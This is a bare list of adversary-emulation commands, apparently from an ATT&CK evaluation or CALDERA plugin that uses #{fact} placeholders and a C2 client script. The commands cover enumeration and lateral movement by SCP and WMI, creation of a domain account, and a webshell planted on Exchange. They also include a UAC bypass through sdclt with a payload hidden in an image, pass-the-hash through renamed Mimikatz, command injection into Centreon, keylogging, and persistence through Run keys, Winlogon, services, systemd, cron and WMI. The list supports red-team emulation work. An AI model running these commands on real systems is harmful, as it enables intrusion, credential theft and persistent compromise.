exec-background xfreerdp /u:'#{network.domain.name}\#{initial.target.user}' /p:'#{initial.target.password}' /v:localhost:13389 /cert-ignore
start copy sss.exe \\127.0.0.1\c$\windows\temp\
C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "79a&LbjM@MlW8XZa" C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\psexec.py kmitnick@10.0.0.7:/tmp/psexec.py;
C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "79a&LbjM@MlW8XZa" C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\runtime kmitnick@10.0.0.7:/tmp/runtime;
C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "79a&LbjM@MlW8XZa" C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\tiny kmitnick@10.0.0.7:/tmp/tiny;
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
"adfind.exe" -f (objectcategory=person) > ad_users.txt
ipconfig /all
"adfind.exe" -f (objectcategory=organizationalUnit) > ad_ous.txt
systeminfo
cmd.exe /c net group "Domain Controllers" /domain
net use
. .\stepTwelve.ps1;
software;
"adfind.exe" -f (objectcategory=group) > ad_group.txt
echo %USERDOMAIN%\%USERNAME%
netstat -ano
"C:\Windows\Temp\tcping.exe" "192.0.2.10" "445"
net userls 192.0.2.20
net localgroup administratorsImport-Module .\ps.ps1 -Verbose -Force;
ProcessList
. .\stepTwelve.ps1;
detectav

sc query
./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 1, "command": "net user leshy Password12345 /add /domain", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
copy C:\Users\Public\contact.aspx "\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\"
./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 3, "proc": "wmic.exe", "args": "/node:#{fourth.target.host} /privileges:enable /output:STDOUT process call create \"cmd.exe /c powershell.exe -File C:\\Windows\\System32\\msiex.ps1 > C:\\Windows\\Temp\\msiexinstallation.log 2>&1\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60 | grep 'ReturnValue = 0;' -i
if (!(test-path -path $env:windir\system32\sdclt.exe)) {
  write-host "[!] sdclt.exe was not found on this host.";
  exit 1;
}
New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;

$username="Administrator";
$payload='powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName "System.Drawing"; $g=a System.Drawing.Bitmap("C:\Users\$($username)\Downloads\monkey.png");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"';

Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value $payload -Force;
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force;

cmd.exe /c sdclt.exe;
cmd.exe /c powershell.exe;
curl --insecure "https://10.0.1.5/search.php?cmd=echo%20%27%2Fvar%2Fwww%2Fhtml%2Fcentreon_module_linux_app64%20%26%27%20%3E%3E%20%2Fvar%2Fwww%2Fhtml%2Finclude%2Ftools%2Fcheck.sh" 2>/dev/null;
./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 3, "proc": "C:\\Windows\\System32\\loadperf.exe", "args": "\"pr::d\" \"slsa::htp /user:#{domain.admin.user} /ntlm:#{domain.admin.ntlm} /domain:#{network.domain.name}.local /remotepc:uosis /pexe:C:\\Windows\\System32\\fs_mgr.exe /sys:1 /prun:C:\\Windows\\System32\\cmu_svc.exe\" \"quit\""}' --task-wait-timeout 60
cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v Java-Update /t REG_SZ /d C:\Users\Public\Java-Update.vbs



if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
  write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
  exit 1;
}
Set-Location -path "C:\Program Files\SysinternalsSuite";
. .\psversion.ps1;
Get-Keystrokes;
Start-Sleep -Seconds 15;
View-Job -JobName "Keystrokes";
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, $env:AppData\uxtheme.exe" -Force
"C:\Windows\System32\schtasks.exe" /create /tn "#{task_name}" /tr "#{task_run}" /sc #{schedule} /ru System
Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('192.0.2.10')"));
Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand $pcode" -Verbose
Set-Location -path "C:\Program Files\SysinternalsSuite";
if (get-service -name "javamtsup" -ErrorAction SilentlyContinue) {
  write-host "[*] Service already exists...Not running persistence step-1";
  exit 1;
}

if (Test-Path -path "readme.ps1") {
  . .\readme.ps1;
  Invoke-Persistence -PersistStep 1;
  write-host "[+] Persistence 1 invoked.";
  exit 0;

} else {
  write-host "[!] readme.ps1 not found.";
  exit 1;
}
powershell.exe -c "restart-computer -force"
Get-WmiObject -Namespace "root/subscription" -list | findstr /i "__Filter";
if ($?) {
  write-host "[*] WMI script has already executed on this machine. Not loading and executing wmi script.";
  exit 1;
} else {
  . .\stepFifteen_wmi.ps1;
  wmi;
  if ($?) {
    write-host "[+] WMI script has successfully executed!";
    exit 0;
  }
  exit 1;
}
Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('192.0.2.10')"));
Inject -PoshCode $pcode;
printf "[Unit]\nDescription=Syslog daemon\n\n[Service]\nWorkingDirectory=$(dirname #{location})\nExecStartPre=/bin/rm -f /tmp/.applocktx\nExecStart=#{location}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/syslogd.service;
chmod 0644 /etc/systemd/system/syslogd.service;
systemctl enable syslogd.service;
systemctl daemon-reload;
. .\stepFourteen_bypassUAC.ps1;
bypass;
dir=$(dirname #{location});
croncontents=$(crontab -l 2>/dev/null);
printf "$croncontents\n1 * * * * cd $dir && #{exe_name}\n@reboot cd $dir && #{exe_name}\n" | crontab -
robocopy BOOSTWRITE.dll C:\\Windows\\Syswow64\\srrstr.dll &&
cmd.exe /c "C:\\Windows\\Syswow64\\SystemPropertiesAdvanced.exe"
./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg add "HKLM\system\currentcontrolset\services\ViperVPNSvc" /t REG_EXPAND_SZ /v ImagePath /d "cmd.exe /c %TEMP%\mxs_installer.exe" /f' --task-wait-timeout 60